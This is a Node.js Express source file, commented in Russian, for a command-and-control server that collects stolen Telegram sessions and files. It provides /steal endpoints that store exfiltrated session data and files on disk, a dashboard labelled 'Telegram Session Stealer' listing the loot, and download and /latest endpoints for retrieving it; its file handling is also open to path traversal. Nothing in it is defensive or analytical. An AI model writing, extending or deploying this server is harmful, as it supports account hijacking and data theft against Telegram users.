const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.text({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));

// Создаём папки для данных
if (!fs.existsSync('stolen')) fs.mkdirSync('stolen');
if (!fs.existsSync('stolen/sessions')) fs.mkdirSync('stolen/sessions');
if (!fs.existsSync('stolen/files')) fs.mkdirSync('stolen/files');

// Главная страница
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Server</title>
            <style>
                body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
                .stats { background: #1a1a1a; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
                a { color: #0f0; }
            </style>
        </head>
        <body>
            <h1>🚀 C2 Server Active</h1>
            <div class="stats">
                <p>📡 Status: ONLINE</p>
                <p>🎯 Target: Telegram Session Stealer</p>
            </div>
            <a href="/list">📋 View stolen data</a>
        </body>
        </html>
    `);
});

// Приём украденных сессий
app.post('/steal', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `stolen/sessions/telegram_${timestamp}.json`;
    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
    console.log(`✅ [${new Date().toISOString()}] Украдена сессия: ${filename}`);
    res.json({ status: 'ok', file: filename });
});

// Приём файлов
app.post('/steal/*', (req, res) => {
    const filename = req.url.split('/').pop();
    const filepath = `stolen/files/${filename}`;
    fs.writeFileSync(filepath, req.body);
    console.log(`✅ [${new Date().toISOString()}] Украден файл: ${filepath}`);
    res.json({ status: 'ok', file: filepath });
});

// Просмотр списка
app.get('/list', (req, res) => {
    const sessions = fs.readdirSync('stolen/sessions').map(f => ({ type: 'session', name: f, path: `/download/sessions/${f}` }));
    const files = fs.readdirSync('stolen/files').map(f => ({ type: 'file', name: f, path: `/download/files/${f}` }));
    
    let html = '<!DOCTYPE html><html><head><title>Stolen Data</title><style>';
    html += 'body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }';
    html += 'h1 { color: #0f0; } .session { background: #1a1a1a; margin: 10px 0; padding: 15px; border-radius: 5px; }';
    html += 'a { color: #0f0; text-decoration: none; }';
    html += '</style></head><body>';
    html += '<h1>📦 Stolen Data</h1><a href="/">← Back</a><br><br>';
    
    if (sessions.length === 0 && files.length === 0) {
        html += '<p>📭 No data stolen yet</p>';
    }
    
    if (sessions.length > 0) {
        html += '<h2>📨 Telegram Sessions:</h2>';
        for (const s of sessions) {
            html += `<div class="session">📄 <a href="${s.path}">${s.name}</a></div>`;
        }
    }
    
    if (files.length > 0) {
        html += '<h2>📁 Stolen Files:</h2>';
        for (const f of files) {
            html += `<div class="session">📄 <a href="${f.path}">${f.name}</a></div>`;
        }
    }
    
    html += '</body></html>';
    res.send(html);
});

// Скачивание файлов
app.get('/download/*', (req, res) => {
    const filepath = path.join(__dirname, req.url);
    if (fs.existsSync(filepath)) {
        res.sendFile(filepath);
    } else {
        res.status(404).send('File not found');
    }
});

// API для последней сессии
app.get('/latest', (req, res) => {
    const sessions = fs.readdirSync('stolen/sessions').sort().reverse();
    if (sessions.length > 0) {
        const data = JSON.parse(fs.readFileSync(`stolen/sessions/${sessions[0]}`, 'utf8'));
        res.json(data);
    } else {
        res.json({ error: 'No data' });
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`🚀 C2 сервер запущен на порту ${PORT}`);
    console.log(`📡 URL: http://localhost:${PORT}`);
});